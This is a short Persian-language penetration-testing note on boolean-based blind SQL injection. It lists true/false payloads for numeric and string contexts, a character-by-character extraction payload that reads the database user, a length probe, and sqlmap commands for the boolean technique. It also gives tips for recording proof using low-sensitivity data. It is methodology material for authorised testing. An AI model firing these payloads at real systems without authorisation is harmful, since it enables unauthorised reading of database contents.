---
tags: [web, sqli, blind, boolean]
---

# Boolean-Based SQL Injection

## اصل آزمون

دو شرط True و False بساز که فقط نتیجه منطقی Query را تغییر دهند. سپس محتوای پاسخ، رفتار Redirect یا وضعیت برنامه را مقایسه کن.

## Context عددی

```sql
AND 1=1-- -
AND 1=2-- -
```

## Context رشته‌ای

```sql
' AND '1'='1'-- -
' AND '1'='2'-- -
```

این نمونه‌ها بسته به Query اصلی ممکن است به حذف کوتیشن، افزودن پرانتز یا تغییر Comment نیاز داشته باشند.

## استخراج با شرط

```sql
AND ASCII(SUBSTRING((SELECT USER()),1,1))>100-- -
```

طول رشته:

```sql
AND LENGTH((SELECT USER()))>5-- -
```

## sqlmap

```bash
sqlmap -r request.txt -p id \
  --technique=B --batch
```

اگر رشته مشخصی فقط در پاسخ True وجود دارد:

```bash
sqlmap -r request.txt -p id \
  --technique=B --string="Welcome" --batch
```

برای پاسخ False نیز می‌توان از `--not-string` استفاده کرد؛ مقدار آن باید از Baseline واقعی گرفته شود.

## اثبات مناسب

- True و False را در چند تکرار ثبت کن.
- اختلاف معنادار صفحه را ذخیره کن.
- یک شرط روی داده کم‌حساسیته مثل طول نام دیتابیس امتحان کن.
- جزئیات مقایسه را در [[Boolean Detection]] ثبت کن.
